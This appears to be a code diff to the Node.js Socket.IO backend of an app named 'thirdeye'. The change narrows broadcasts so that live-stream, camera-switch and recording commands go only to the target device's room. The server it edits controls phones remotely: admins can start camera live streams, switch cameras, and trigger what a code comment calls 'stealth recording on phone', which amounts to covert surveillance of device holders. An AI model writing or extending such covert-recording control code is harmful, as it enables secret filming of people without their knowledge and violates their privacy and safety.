@@ -24,6 +24,7 @@ const io = new Server(server, {
   cors: { origin: '*' },
   maxHttpBufferSize: 5e6, // 5MB buffer for video frames
 });
+app.set('io', io);
 
 const PORT = process.env.PORT || 5000;
 const MONGODB_URI = process.env.MONGODB_URI || 'mongodb://127.0.0.1:27017/thirdeye';
@@ -281,13 +282,8 @@ io.on('connection', (socket) => {
       dev.isStreaming = true;
     }
 
-    // Broadcast to room and devices channel so device receives it reliably
+    // Broadcast to target device room
     io.to(`device_${deviceId}`).emit('start-live-stream', {
-      adminSocketId: socket.id,
-      deviceId,
-      camera,
-    });
-    io.to('devices').emit('start-live-stream', {
       adminSocketId: socket.id,
       deviceId,
       camera,
@@ -329,7 +325,6 @@ io.on('connection', (socket) => {
     if (!room || room.size === 0) {
       console.log(`🛑 All admins left, stopping live stream on: ${deviceId}`);
       io.to(`device_${deviceId}`).emit('stop-live-stream', { deviceId });
-      io.to('devices').emit('stop-live-stream', { deviceId });
       const dev = connectedDevices.get(deviceId);
       if (dev) dev.isStreaming = false;
     }
@@ -339,7 +334,6 @@ io.on('connection', (socket) => {
   socket.on('switch-camera', ({ deviceId, camera }) => {
     console.log(`🔄 Remote switch camera for ${deviceId} -> ${camera}`);
     io.to(`device_${deviceId}`).emit('switch-camera', { deviceId, camera });
-    io.to('devices').emit('switch-camera', { deviceId, camera });
   });
 
   // Admin remotely triggers stealth recording on phone
@@ -350,7 +344,6 @@ io.on('connection', (socket) => {
       await Device.findOneAndUpdate({ deviceId }, { isRecording: true, cameraLens: lens });
     } catch (e) {}
     io.to(`device_${deviceId}`).emit('start-remote-recording', { deviceId, camera: lens });
-    io.to('devices').emit('start-remote-recording', { deviceId, camera: lens });
     io.to('admins').emit('device-recording-status', { deviceId, isRecording: true, camera: lens });
   });
 
@@ -361,7 +354,6 @@ io.on('connection', (socket) => {
       await Device.findOneAndUpdate({ deviceId }, { isRecording: false });
     } catch (e) {}
     io.to(`device_${deviceId}`).emit('stop-remote-recording', { deviceId });
-    io.to('devices').emit('stop-remote-recording', { deviceId });
     io.to('admins').emit('device-recording-status', { deviceId, isRecording: false });
   });
 
